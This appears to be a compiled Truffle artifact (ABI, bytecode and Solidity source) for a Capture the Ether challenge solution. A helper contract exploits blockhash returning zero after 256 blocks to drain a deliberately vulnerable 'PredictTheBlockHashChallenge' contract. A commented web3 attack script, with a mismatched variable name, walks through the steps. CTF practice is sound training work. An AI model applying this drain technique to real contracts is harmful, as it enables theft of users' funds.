{
  "contractName": "PredictHashHelper",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "getOtherContract",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "newAddr",
          "type": "address"
        }
      ],
      "name": "setOtherContract",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "otherContract",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "caller",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "newAddress",
          "type": "address"
        }
      ],
      "name": "SetOtherContract",
      "type": "event"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getSettlementBlockNumber",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "blockNum",
          "type": "uint256"
        }
      ],
      "name": "getAnswer",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "wasteBlock",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "isComplete",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "lockInGuess",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "settle",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x606060405260008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550341561005057600080fd5b6107f78061005f6000396000f3006060604052600436106100a4576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630b4b5198146100a657806311da60b4146100fb5780631e73c0451461011057806335a28f3e146101395780633ccfd60b1461017257806380d4e15714610187578063b2fa1c9e146101b0578063b5ab58dc146101dd578063e98d36e11461021c578063ed7f559c14610271575b005b34156100b157600080fd5b6100b961028d565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b341561010657600080fd5b61010e6102b6565b005b341561011b57600080fd5b610123610434565b6040518082815260200191505060405180910390f35b341561014457600080fd5b610170600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190505061046a565b005b341561017d57600080fd5b610185610544565b005b341561019257600080fd5b61019a61059d565b6040518082815260200191505060405180910390f35b34156101bb57600080fd5b6101c36105a7565b604051808215151515815260200191505060405180910390f35b34156101e857600080fd5b6101fe6004808035906020019091905050610695565b60405180826000191660001916815260200191505060405180910390f35b341561022757600080fd5b61022f6106a0565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b61028b6004808035600019169060200190919050506106c5565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6000806000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16141515156102fe57600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff166311da60b46040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561038557600080fd5b5af1151561039257600080fd5b505050600115158173ffffffffffffffffffffffffffffffffffffffff1663b2fa1c9e6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b15156103fc57600080fd5b5af1151561040957600080fd5b50505060405180519050151514151561042157600080fd5b610429610544565b600060018190555050565b60006001600060148282829054906101000a900460ff160192506101000a81548160ff021916908360ff16021790555043905090565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055507f081eb3239ea805b9a08e7c4f93baacc9d1965ecde599e5ed9b2b3936cd3fe0b83382604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019250505060405180910390a150565b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050151561059b57600080fd5b565b6000600154905090565b60008060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16141515156105f157600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663b2fa1c9e6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b151561067857600080fd5b5af1151561068557600080fd5b5050506040518051905091505090565b600081409050919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000806000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415151561070d57600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663ed7f559c670de0b6b3a7640000846040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082600019166000191681526020019150506000604051808303818588803b15156107af57600080fd5b5af115156107bc57600080fd5b505050504360018190555050505600a165627a7a72305820a9e145388dc911229d1b00db8cbae7af5e6cee99607aae0782226e25997d49740029",
  "source": "pragma solidity ^0.4.21;\r\n\r\nimport './OtherContract.sol';\r\n\r\n/*\r\nconst oneEth = web3.utils.toWei('1', 'ether');\r\nvar predictTheBlockHashChallenge = await PredictTheBlockHashChallenge.deployed();\r\nvar predictHashHelper = await PredictHashHelper.deployed();\r\n\r\nvar blockNumTarget = await web3.eth.getBlockNumber() + 260;\r\nvar answer = await predictHashHelper.getAnswer(blockNumTarget);\r\nawait predictHashHelper.lockInGuess(answer, {from: accounts[0], value: oneEth});\r\nvar blockNumCurrent = await web3.eth.getBlockNumber();\r\nwhile (blockNumCurrent < blockNumberTarget) {\r\n    await predictHashHelper.wasteBlock();\r\n    blockNumCurrent = await web3.eth.getBlockNumber();\r\n}\r\nawait predictTheBlockHashChallenge.settle();\r\nawait predictTheBlockHashChallenge.isComplete();\r\n\r\nvar testArray = new Uint8Array(100);\r\nvar promises = testArray.map(x => predictHashHelper.wasteBlock());\r\nawait Promise.all(promises);\r\n*/\r\n\r\ncontract PredictHashHelper is OtherContract {\r\n    uint8 waste;\r\n    uint256 settlementBlockNumber;\r\n\r\n    function getSettlementBlockNumber() public view returns (uint256) {\r\n        return settlementBlockNumber;\r\n    }\r\n\r\n    function getAnswer(uint256 blockNum) public view returns (bytes32) {\r\n        return block.blockhash(blockNum);\r\n    }\r\n\r\n    function wasteBlock() public returns (uint256) {\r\n        waste += 1;\r\n        return block.number;\r\n    }\r\n\r\n    function() public payable { \r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        require(otherContract != 0);\r\n        PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);\r\n        return predictTheBlockHashChallenge.isComplete();\r\n    }\r\n\r\n    function withdraw() public {\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n\r\n    function lockInGuess(bytes32 hash) public payable {\r\n        require(otherContract != 0);\r\n        PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);\r\n        predictTheBlockHashChallenge.lockInGuess.value(1 ether)(hash);\r\n        settlementBlockNumber = block.number;\r\n    }    \r\n\r\n    function settle() public {\r\n        require(otherContract != 0);\r\n        PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);\r\n        predictTheBlockHashChallenge.settle();\r\n        require(predictTheBlockHashChallenge.isComplete() == true);\r\n        withdraw();\r\n        settlementBlockNumber = 0;\r\n    }\r\n}\r\n\r\ncontract PredictTheBlockHashChallenge {\r\n    address guesser;\r\n    bytes32 guess;\r\n    uint256 settlementBlockNumber;\r\n\r\n    function PredictTheBlockHashChallenge() public payable {\r\n        require(msg.value == 1 ether);\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        return address(this).balance == 0;\r\n    }\r\n\r\n    function lockInGuess(bytes32 hash) public payable {\r\n        require(guesser == 0);\r\n        require(msg.value == 1 ether);\r\n\r\n        guesser = msg.sender;\r\n        guess = hash;\r\n        settlementBlockNumber = block.number + 1;\r\n    }\r\n\r\n    function settle() public {\r\n        require(msg.sender == guesser);\r\n        require(block.number > settlementBlockNumber);\r\n\r\n        bytes32 answer = block.blockhash(settlementBlockNumber);\r\n\r\n        guesser = 0;\r\n        if (guess == answer) {\r\n            msg.sender.transfer(2 ether);\r\n        }\r\n    }\r\n}\r\n",
  "sourcePath": "C:\\defi\\capturetheether\\contracts\\PredictTheBlockHashChallenge.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.21+commit.dfe3193c.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-11-13T20:59:43.423Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}